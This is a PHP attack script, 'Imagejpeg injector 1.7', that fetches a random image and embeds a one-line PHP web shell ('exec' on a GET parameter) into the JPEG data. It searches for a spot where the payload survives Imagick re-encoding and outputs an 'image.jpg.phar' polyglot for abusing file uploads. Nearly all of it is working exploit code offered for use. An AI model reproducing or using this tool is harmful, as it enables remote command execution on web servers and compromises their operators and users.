<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);

$orig = 'image.jpg';
$code = '<?=exec($_GET["c"])?>';
$quality = 85;
$base_url = "https://picsum.photos/";

echo "-=Imagejpeg injector 1.7=-\n";

do {
    $x = 100;
    $y = 100;
    $url = $base_url . "/$x/$y/";

    echo "[+] Fetching image ($x X $y) from $url\n";
    $image_data = file_get_contents($url);
    if ($image_data === false) {
        die("Error fetching image from $url\n");
    }
    file_put_contents($orig, $image_data);
} while (!tryInject($orig, $code, $quality));

echo "[+] It seems like it worked!\n";
echo "[+] Result file: image.jpg.phar\n";

function tryInject($orig, $code, $quality) {
    $result_file = 'image.jpg.phar';
    $tmp_filename = $orig . '_mod2.jpg';

    if (!class_exists('Imagick')) {
        die("Imagick library is not available.\n");
    }

    $imagick = new Imagick($orig);
    $imagick->setImageFormat('jpeg');
    $imagick->setImageCompressionQuality($quality);
    $imagick->writeImage($tmp_filename);
    
    $data = file_get_contents($tmp_filename);
    $tmpData = $data;

    echo "[+] Jumping to end byte\n";
    $start_byte = findStart($data);

    echo "[+] Searching for valid injection point\n";
    for ($i = strlen($data) - 1; $i > $start_byte; --$i) {
        $tmpData = substr_replace($data, $code, $i, 0);

        $imagick = new Imagick();
        try {
            $imagick->readImageBlob($tmpData);
        } catch (Exception $e) {
            echo "Failed to create image from string data at position $i.\n";
            continue;
        }

        $imagick->writeImage($result_file);

        if (checkCodeInFile($result_file, $code)) {
            unlink($tmp_filename);
            unlink($result_file);
            sleep(1);

            file_put_contents($result_file, $tmpData);
            echo "[!] Temp solution, if you get a 'recoverable parse error' here, it means it probably failed\n";

            sleep(1);
            $imagick->readImage($result_file);

            return true;
        } else {
            unlink($result_file);
        }
    }
    unlink($orig);
    unlink($tmp_filename);
    return false;
}

function findStart($str) {
    for ($i = 0; $i < strlen($str); ++$i) {
        if (ord($str[$i]) == 0xFF && ord($str[$i + 1]) == 0xDA) {
            return $i + 2;
        }
    }
    return -1;
}

function checkCodeInFile($file, $code) {
    if (file_exists($file)) {
        $contents = loadFile($file);
    } else {
        $contents = "0";
    }
    return strstr($contents, $code);
}

function loadFile($file) {
    $handle = fopen($file, "r");
    $buffer = fread($handle, filesize($file));
    fclose($handle);
    return $buffer;
}
